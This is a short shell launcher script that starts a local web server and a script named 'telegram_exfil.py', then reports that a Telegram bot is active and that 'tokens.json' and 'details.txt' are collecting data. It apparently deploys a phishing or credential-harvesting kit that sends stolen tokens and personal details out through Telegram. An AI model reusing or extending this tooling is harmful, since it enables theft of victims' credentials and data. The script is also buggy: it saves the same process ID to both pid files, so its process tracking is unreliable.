
# START EVERYTHING AUTOMATICALLY
echo "🚀 Starting  servers..."
python3 serve.py > serve.log 2>&1 &
python3 telegram_exfil.py > telegram.log 2>&1 &

# SAVE PIDS
echo $! > serve.pid  
echo $! > telegram.pid

echo "✅ FULLY AUTOMATIC DEPLOYED"
echo "🌐  URL: http://localhost:5000"
echo "📱 Telegram: Active (check @yourbot)"
echo "💾 Watch: tokens.json + details.txt"
echo "📊 Logs: serve.log telegram.log"